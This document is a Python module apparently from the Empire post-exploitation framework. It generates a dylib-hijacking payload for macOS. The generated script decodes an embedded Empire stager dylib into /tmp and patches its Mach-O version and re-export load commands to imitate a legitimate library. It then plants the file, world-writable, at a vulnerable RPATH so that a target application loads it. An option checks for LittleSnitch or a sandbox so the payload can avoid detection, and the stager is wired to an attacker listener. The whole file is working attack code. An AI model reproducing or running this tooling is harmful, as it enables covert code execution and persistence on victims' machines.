import base64
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'CreateDylibHijacker',
            'Author': ['@patrickwardle,@xorrior'],
            'Description': ('Configures and Empire dylib for use in a Dylib hijack, given the path to a legitimate dylib of a vulnerable application. The architecture of the dylib must match the target application. The configured dylib will be copied local to the hijackerPath'),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : True,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                'comment',
                'https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x'
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Arch' : {
                'Description'   :   'Arch: x86/x64',
                'Required'      :   True,
                'Value'         :   'x86'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'LegitimateDylibPath' : {
                'Description'   :   'Full path to the legitimate dylib of the vulnerable application',
                'Required'      :   True,
                'Value'         :   ''
            },
            'VulnerableRPATH' : {
                'Description'   :   'Full path to where the hijacker should be planted. This will be the RPATH in the Hijack Scanner module.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        arch = self.options['Arch']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
        dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
        encodedDylib = base64.b64encode(dylibBytes)
        dylib = self.options['LegitimateDylibPath']['Value']
        vrpath = self.options['VulnerableRPATH']['Value']
        script = """
from ctypes import *
def run(attackerDYLIB):
    import ctypes
    import io
    import os
    import sys
    import fcntl
    import shutil
    import struct
    import stat
    LC_REQ_DYLD = 0x80000000
    LC_LOAD_WEAK_DYLIB = LC_REQ_DYLD | 0x18
    LC_RPATH = (0x1c | LC_REQ_DYLD)
    LC_REEXPORT_DYLIB = 0x1f | LC_REQ_DYLD
    (
        LC_SEGMENT, LC_SYMTAB, LC_SYMSEG, LC_THREAD, LC_UNIXTHREAD, LC_LOADFVMLIB,
        LC_IDFVMLIB, LC_IDENT, LC_FVMFILE, LC_PREPAGE, LC_DYSYMTAB, LC_LOAD_DYLIB,
        LC_ID_DYLIB, LC_LOAD_DYLINKER, LC_ID_DYLINKER, LC_PREBOUND_DYLIB,
        LC_ROUTINES, LC_SUB_FRAMEWORK, LC_SUB_UMBRELLA, LC_SUB_CLIENT,
        LC_SUB_LIBRARY, LC_TWOLEVEL_HINTS, LC_PREBIND_CKSUM
    ) = range(0x1, 0x18)
    MH_MAGIC = 0xfeedface
    MH_CIGAM = 0xcefaedfe
    MH_MAGIC_64 = 0xfeedfacf
    MH_CIGAM_64 = 0xcffaedfe
    _CPU_ARCH_ABI64  = 0x01000000
    CPU_TYPE_NAMES = {
        -1:     'ANY',
        1:      'VAX',
        6:      'MC680x0',
        7:      'i386',
        _CPU_ARCH_ABI64  | 7:    'x86_64',
        8:      'MIPS',
        10:     'MC98000',
        11:     'HPPA',
        12:     'ARM',
        13:     'MC88000',
        14:     'SPARC',
        15:     'i860',
        16:     'Alpha',
        18:     'PowerPC',
        _CPU_ARCH_ABI64  | 18:    'PowerPC64',
    }
    class mach_header(ctypes.Structure):
        _fields_ = [
            ("magic", ctypes.c_uint),
            ("cputype", ctypes.c_uint),
            ("cpusubtype", ctypes.c_uint),
            ("filetype", ctypes.c_uint),
            ("ncmds", ctypes.c_uint),
            ("sizeofcmds", ctypes.c_uint),
            ("flags", ctypes.c_uint)
        ]
    class mach_header_64(ctypes.Structure):
        _fields_ = mach_header._fields_ + [('reserved',ctypes.c_uint)]
    class load_command(ctypes.Structure):
        _fields_ = [
            ("cmd", ctypes.c_uint),
            ("cmdsize", ctypes.c_uint)
        ]
    LC_HEADER_SIZE = 0x8
    def checkPrereqs(attackerDYLIB, targetDYLIB):
        if not os.path.exists(attackerDYLIB):
            print 'ERROR: dylib \\'%%s\\' not found' %% (attackerDYLIB)
            return False
        if not os.path.exists(targetDYLIB):
            print 'ERROR: dylib \\'%%s\\' not found' %% (targetDYLIB)
            return False
        attacker = open(attackerDYLIB)
        target = open(targetDYLIB)
        attackerHeader = mach_header.from_buffer_copy(attacker.read(28))
        targetHeader = mach_header.from_buffer_copy(target.read(28))
        if attackerHeader.cputype != targetHeader.cputype:
            print 'ERROR: Architecture mismatch'
            attacker.close()
            target.close()
            return False
        return True
    def findLoadCommand(fileHandle, targetLoadCommand):
        MACHHEADERSZ64 = 32
        MACHHEADERSZ = 28
        matchedOffsets = []
        try:
            header = mach_header.from_buffer_copy(fileHandle.read(MACHHEADERSZ))
            if header.magic == MH_MAGIC_64:
                fileHandle.seek(0, io.SEEK_SET)
                header = mach_header_64.from_buffer_copy(fileHandle.read(MACHHEADERSZ64))
            ncmds = header.ncmds
            current = fileHandle.tell() #save offset to load command
            for cmd in range(ncmds):
                offset = current
                lc = load_command.from_buffer_copy(fileHandle.read(LC_HEADER_SIZE))
                size = lc.cmdsize
                if lc.cmd == targetLoadCommand:
                    matchedOffsets.append(offset)
                fileHandle.seek(size - LC_HEADER_SIZE, io.SEEK_CUR)
                current = fileHandle.tell()
        except Exception, e:
            print 'EXCEPTION (finding load commands): %%s' %% e
            matchedOffsets = None
        return matchedOffsets
    def configureVersions(attackerDYLIB, targetDYLIB):
        try:
            print ' [+] parsing \\'%%s\\' to extract version info' %% (os.path.split(targetDYLIB)[1])
            fileHandle = open(targetDYLIB, 'rb')
            versionOffsets = findLoadCommand(fileHandle, LC_ID_DYLIB)
            if not versionOffsets or not len(versionOffsets):
                print 'ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %%s' %% (os.path.split(targetDYLIB)[1])
                return False
            print '     found \\'LC_ID_DYLIB\\' load command at offset(s): %%s' %% (versionOffsets)
            fileHandle.seek(versionOffsets[0], io.SEEK_SET)
            fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)
            '''
            struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
            '''
            currentVersion = fileHandle.read(4)
            compatibilityVersion = fileHandle.read(4)
            print '     extracted current version: 0x%%x' %% (struct.unpack('<L', currentVersion)[0])
            print '     extracted compatibility version: 0x%%x' %% (struct.unpack('<L', compatibilityVersion)[0])
            fileHandle.close()
            print ' [+] parsing \\'%%s\\' to find version info' %% (os.path.split(attackerDYLIB)[1])
            fileHandle = open(attackerDYLIB, 'rb+')
            versionOffsets = findLoadCommand(fileHandle, LC_ID_DYLIB)
            if not versionOffsets or not len(versionOffsets):
                print 'ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %%s' %% (os.path.split(attackerDYLIB)[1])
                return False
            print '     found \\'LC_ID_DYLIB\\' load command at offset(s): %%s' %% (versionOffsets)
            print ' [+] updating version info in %%s to match %%s' %% ((os.path.split(attackerDYLIB)[1]), (os.path.split(targetDYLIB)[1]))
            for versionOffset in versionOffsets:
                fileHandle.seek(versionOffset, io.SEEK_SET)
                fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)
                print 'setting version info at offset %%s' %% (versionOffset)
                fileHandle.write(currentVersion)
                fileHandle.write(compatibilityVersion)
            fileHandle.close()
        except Exception, e:
            print 'EXCEPTION (configuring version info): %%s' %% e
        return True
    def configureReExport(attackerDYLIB, targetDYLIB):
        try:
            print ' [+] parsing \\'%%s\\' to extract faux re-export info' %% (os.path.split(attackerDYLIB)[1])
            fileHandle = open(attackerDYLIB, 'rb+')
            reExportOffsets = findLoadCommand(fileHandle, LC_REEXPORT_DYLIB)
            if not reExportOffsets or not len(reExportOffsets):
                print 'ERROR: failed to find \\'LC_REEXPORT_DYLIB\\' load command in %%s' %% (os.path.split(attackerDYLIB)[1])
                return False
            print '     found \\'LC_REEXPORT_DYLIB\\' load command at offset(s): %%s' %% (reExportOffsets)
            '''
            struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
            '''
            for reExportOffset in reExportOffsets:
                fileHandle.seek(reExportOffset, io.SEEK_SET)
                fileHandle.seek(0x4, io.SEEK_CUR)
                commandSize = struct.unpack('<L', fileHandle.read(4))[0]
                print '     extracted LC command size: 0x%%x' %% (commandSize)
                pathOffset = struct.unpack('<L', fileHandle.read(4))[0]
                print '     extracted path offset: 0x%%x' %% (pathOffset)
                fileHandle.seek(reExportOffset + pathOffset, io.SEEK_SET)
                pathSize = commandSize - (fileHandle.tell() - reExportOffset)
                print '     computed path size: 0x%%x' %% (pathSize)
                data = targetDYLIB + '\\0' * (pathSize - len(targetDYLIB))
                fileHandle.write(data)
                fileHandle.close()
                print ' [+] updated embedded re-export'
        except Exception, e:
            print 'EXCEPTION (configuring re-exports): %%s' %% e
            return False
        return True
    def configure(attackerDYLIB, targetDYLIB):
        if not configureVersions(attackerDYLIB, targetDYLIB):
            print 'ERROR: failed to configure version info'
            return False
        if not configureReExport(attackerDYLIB, targetDYLIB):
            print 'ERROR: failed to configure re-export'
            return False
        return True
    targetDYLIB = "%s"
    vrpath = "%s"
    configuredDYLIB = ""
    configuredDYLIB = os.path.split(attackerDYLIB)[0]+'/' + os.path.split(targetDYLIB)[1]
    print ' [+] configuring %%s to hijack %%s' %% (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1])
    if not checkPrereqs(attackerDYLIB, targetDYLIB):
        print 'ERROR: prerequisite check failed\\n'
        return ""
    if not configure(attackerDYLIB, targetDYLIB):
        print 'ERROR: failed to configure %%s\\n' %% (os.path.split(targetDYLIB)[1])
        return ""
    print ' [+] copying configured .dylib to %%s' %% (configuredDYLIB)
    shutil.copy2(attackerDYLIB, configuredDYLIB)
    os.remove(attackerDYLIB)
    if not os.path.exists(os.path.split(vrpath)[0]):
        os.makedirs(os.path.split(vrpath)[0])
    os.chmod(configuredDYLIB, 0777)
    shutil.copy2(configuredDYLIB, vrpath)
    os.remove(configuredDYLIB)
    print '\\nHijacker created, renamed to %%s, and copied to %%s' %% (configuredDYLIB,vrpath)
import base64
import uuid
encbytes = "%s"
filename = str(uuid.uuid4())
path = "/tmp/" + filename + ".dylib"
decodedDylib = base64.b64decode(encbytes)
temp = open(path,'wb')
temp.write(decodedDylib)
temp.close()
run(path)
""" % (dylib,vrpath,encodedDylib)
        return script